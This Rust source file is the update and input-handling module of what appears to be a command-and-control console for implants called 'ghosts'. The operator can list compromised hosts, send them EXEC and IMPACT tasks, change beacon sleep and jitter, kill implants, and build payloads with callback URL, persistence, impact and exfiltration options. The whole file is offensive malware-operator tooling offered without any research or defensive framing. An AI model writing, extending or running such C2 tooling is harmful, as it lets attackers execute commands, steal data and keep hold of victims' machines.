use crate::action::Action;
use crate::models::{GhostConfigUpdate, TaskRequest};
use crate::state::{AppState, BuilderField, ConfigField, CurrentScreen};

#[derive(Debug, PartialEq)]
pub enum Command {
    Quit,
    FetchGhosts,
    FetchTasks(String),
    SendTask { ghost_id: String, req: TaskRequest },
    UpdateGhostConfig { ghost_id: String, config: GhostConfigUpdate },
    KillGhost(String),
    BuildPayload {
        url: String,
        port: String,
        debug: bool,
        persistence: bool,
        impact: bool,
        exfil: bool
    }
}

pub fn update(app: &mut AppState, action: Action) -> Option<Command> {
    match action {
        // system
        Action::Quit => return Some(Command::Quit),
        Action::Tick => {},
        Action::Resize(_, _) => {},

        // global navigation
        Action::NextTab => app.next_tab(),
        Action::PrevTab => app.prev_tab(),
        Action::ToggleHelp => app.show_help = !app.show_help,

        // context-sensitive input
        Action::Up => handle_nav_up(app),
        Action::Down => handle_nav_down(app),
        Action::Left => app.prev_tab(),
        Action::Right => app.next_tab(),
        Action::Enter => return handle_enter(app),
        Action::Esc => handle_esc(app),
        Action::Backspace => handle_backspace(app),
        Action::Char(c) => return handle_char_input(app, c),

        // view-dependent actions
        Action::OpenActionMenu => {
            if app.current_screen == CurrentScreen::Dashboard && app.dashboard.selected_ghost_id().is_some() {
                app.show_action_menu = true;
            }
        },
        Action::ConfirmKillGhost => {
            if let Some(gid) = app.dashboard.selected_ghost_id() {
                app.show_action_menu = false;
                app.status_message = format!("Killing ghost {}...", gid);

                return Some(Command::KillGhost(gid));
            }
        },
        Action::SubmitGhostConfig => return handle_config_submit(app),
        Action::ToggleBuilderSwitch => handle_builder_toggle(app),
        Action::StartBuild => return handle_build_start(app),

        // network
        Action::ReceiveGhosts(result) => match result {
            Ok(ghosts) => {
                app.dashboard.ghosts = ghosts;
                app.status_message = format!("Updated: {} ghosts online", app.dashboard.ghosts.len());
            },
            Err(e) => app.status_message = format!("Error fetching ghosts: {}", e)
        },
        Action::ReceiveTasks(result) => match result {
            Ok(tasks) => {
                let should_scroll = tasks.len() > app.terminal.tasks.len();
                app.terminal.tasks = tasks;

                if should_scroll {
                    app.terminal.scroll_to_bottom();
                }
            },
            Err(e) => app.status_message = format!("Error fetching tasks: {}", e)
        },
        Action::ReceiveTaskSendResult(result) => match result {
            Ok(message) => {
                app.status_message = format!("Task send: {}", message);

                if let Some(gid) = app.terminal.active_ghost_id.clone() {
                    return Some(Command::FetchTasks(gid));
                }
            },
            Err(e) => app.status_message = format!("Error: {}", e)
        },
        Action::ReceiveConfigUpdateResult(result) => match result {
            Ok(message) => app.status_message = format!("Config updated: {}", message),
            Err(e) => app.status_message = format!("Error: {}", e)
        },
        Action::ReceiveKillResult(result) => match result {
            Ok(message) => {
                app.status_message = format!("Kill result: {}", message);

                return Some(Command::FetchGhosts);
            },
            Err(e) => app.status_message = format!("Error: {}", e)
        },
        Action::ReceiveBuildResult(result) => match result {
            Ok(message) => {
                app.builder.build_status_msg = "SUCCESS".to_string();
                app.status_message = format!("Build success: {}", message)
            },
            Err(e) => {
                app.builder.build_status_msg = "FAILED".to_string();
                app.status_message = format!("Error: {}", e);
            }
        }
    }

    None
}

fn handle_nav_up(app: &mut AppState) {
    if app.show_action_menu {
        return;
    }

    match app.current_screen {
        CurrentScreen::Dashboard => app.dashboard.select_prev(),
        CurrentScreen::Terminal => app.terminal.scroll_up(),
        CurrentScreen::Config => app.config.prev_field(),
        CurrentScreen::Builder => app.builder.prev_field()
    }
}

fn handle_nav_down(app: &mut AppState) {
    if app.show_action_menu {
        return;
    }

    match app.current_screen {
        CurrentScreen::Dashboard => app.dashboard.select_next(),
        CurrentScreen::Terminal => app.terminal.scroll_down(),
        CurrentScreen::Config => app.config.next_field(),
        CurrentScreen::Builder => app.builder.next_field()
    }
}

fn handle_enter(app: &mut AppState) -> Option<Command> {
    if app.show_action_menu {
        return Some(Command::KillGhost(app.dashboard.selected_ghost_id()?));
    }

    match app.current_screen {
        CurrentScreen::Dashboard => {
            if let Some(gid) = app.dashboard.selected_ghost_id() {
                app.current_screen = CurrentScreen::Terminal;
                app.terminal.active_ghost_id = Some(gid.clone());
                app.status_message = format!("Viewing tasks for {}", gid);

                return Some(Command::FetchTasks(gid));
            }
        },
        CurrentScreen::Terminal => {
            let input = app.terminal.input_buffer.trim().to_string();
            if input.is_empty() || app.terminal.active_ghost_id.is_none() {
                return None;
            }

            let ghost_id = app.terminal.active_ghost_id.clone().unwrap();
            app.terminal.input_buffer.clear();

            let parts: Vec<&str> = input.splitn(2, ' ').collect();
            let (command, args) = match parts[0] {
                "EXEC" | "STOP_HAUNT" | "IMPACT" => (parts[0].to_string(), parts.get(1).unwrap_or(&"").to_string()),
                _ => ("EXEC".to_string(), input)
            };

            return Some(Command::SendTask {
                ghost_id,
                req: TaskRequest { command, args }
            });
        },
        CurrentScreen::Config => {
            if app.config.selected_field == ConfigField::Submit {
                return handle_config_submit(app);
            } else {
                app.config.next_field();
            }
        },
        CurrentScreen::Builder => {
            if app.builder.selected_field == BuilderField::Submit {
                return handle_build_start(app);
            }
            
            match app.builder.selected_field {
                BuilderField::Url | BuilderField::Port => app.builder.next_field(),
                _ => handle_builder_toggle(app)
            }
        }
    }

    None
}

fn handle_esc(app: &mut AppState) {
    if app.show_action_menu {
        app.show_action_menu = false;

        return;
    }

    if app.current_screen == CurrentScreen::Terminal {
        app.current_screen = CurrentScreen::Dashboard;
    }
}

fn handle_backspace(app: &mut AppState) {
    match app.current_screen {
        CurrentScreen::Terminal => { app.terminal.input_buffer.pop(); },
        CurrentScreen::Config => match app.config.selected_field {
            ConfigField::Sleep => { app.config.sleep_input.pop(); },
            ConfigField::Jitter => { app.config.jitter_input.pop(); },
            _ => {},
        },
        CurrentScreen::Builder => match app.builder.selected_field {
            BuilderField::Url => { app.builder.target_url.pop(); },
            BuilderField::Port => { app.builder.target_port.pop(); },
            _ => {}
        },
        _ => {}
    }
}

fn handle_char_input(app: &mut AppState, c: char) -> Option<Command> {
    let is_typing = match app.current_screen {
        CurrentScreen::Terminal => true,
        CurrentScreen::Config => c.is_numeric(),
        CurrentScreen::Builder => matches!(app.builder.selected_field, BuilderField::Url | BuilderField::Port),
        _ => false
    };

    if !is_typing {
        match c {
            'q' => return Some(Command::Quit),
            'h' => { app.show_help = !app.show_help; return None; },
            _ => {}
        }
    }

    match app.current_screen {
        CurrentScreen::Dashboard => {
            if c == 'x' {
                if app.dashboard.selected_ghost_id().is_some() {
                    app.show_action_menu = true;
                }
            }

            if c == 'r' {
                return Some(Command::FetchGhosts);
            }
        },
        CurrentScreen::Terminal => {
            app.terminal.input_buffer.push(c);
        },
        CurrentScreen::Config => {
            if c.is_numeric() {
                match app.config.selected_field {
                    ConfigField::Sleep => app.config.sleep_input.push(c),
                    ConfigField::Jitter => app.config.jitter_input.push(c),
                    _ => {}
                }
            }
        },
        CurrentScreen::Builder => {
            match app.builder.selected_field {
                BuilderField::Url => {
                    app.builder.target_url.push(c);
                },
                BuilderField::Port => {
                    if c.is_numeric() {
                        app.builder.target_port.push(c);
                    }
                },
                _ => {}
            }
        }
    }

    None
}

fn handle_config_submit(app: &mut AppState) -> Option<Command> {
    if let Some(gid) = app.dashboard.selected_ghost_id() {
        let sleep = app.config.sleep_input.parse::<i64>().unwrap_or(10);
        let jitter = app.config.jitter_input.parse::<i16>().unwrap_or(5);

        app.status_message = "Sending config...".to_string();

        return Some(Command::UpdateGhostConfig {
            ghost_id: gid,
            config: GhostConfigUpdate { sleep_interval: sleep, jitter_percent: jitter }
        });
    }

    None
}

fn handle_builder_toggle(app: &mut AppState) {
    use BuilderField::*;

    match app.builder.selected_field {
        EnableDebug => app.builder.enable_debug = !app.builder.enable_debug,
        EnablePersistence => app.builder.enable_persistence = !app.builder.enable_persistence,
        EnableImpact => app.builder.enable_impact = !app.builder.enable_impact,
        EnableExfil => app.builder.enable_exfil = !app.builder.enable_exfil,
        _ => {}
    }
}

fn handle_build_start(app: &mut AppState) -> Option<Command> {
    app.builder.build_status_msg = "BUILDING...".to_string();
    app.status_message = "Starting build process...".to_string();

    Some(Command::BuildPayload {
        url: app.builder.target_url.clone(),
        port: app.builder.target_port.clone(),
        debug: app.builder.enable_debug,
        persistence: app.builder.enable_persistence,
        impact: app.builder.enable_impact,
        exfil: app.builder.enable_exfil
    })
}
